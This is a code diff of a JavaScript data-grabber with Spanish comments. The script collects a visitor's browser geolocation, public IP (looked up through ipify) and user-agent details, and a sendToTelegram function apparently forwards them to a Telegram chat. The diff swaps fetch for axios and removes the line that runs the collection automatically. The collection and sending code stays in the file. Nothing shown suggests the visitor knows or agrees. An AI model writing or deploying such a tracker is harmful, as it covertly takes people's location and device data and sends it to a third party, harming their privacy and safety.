@@ -23,8 +23,6 @@ function sendToTelegram(message) {
       console.error('Error al enviar el mensaje a Telegram:', error);
     });
 }
-
-// Obtener datos de ubicación, IP, dispositivo, navegador y sistema operativo
 function getData() {
   // Obtener la ubicación
   if (navigator.geolocation) {
@@ -33,11 +31,10 @@ function getData() {
       var longitude = position.coords.longitude;
       userData.location = latitude + ',' + longitude;
 
-      // Obtener la IP
-      fetch('https://api.ipify.org/?format=json')
-        .then(response => response.json())
-        .then(data => {
-          userData.ip = data.ip;
+      // Obtener la IP utilizando axios
+      axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+          userData.ip = response.data.ip;
 
           // Obtener información del dispositivo, navegador y sistema operativo
           var userAgent = navigator.userAgent;
@@ -63,6 +60,3 @@ function getData() {
     });
   }
 }
-
-// Llamar a la función getData para recopilar y enviar los datos
-getData();
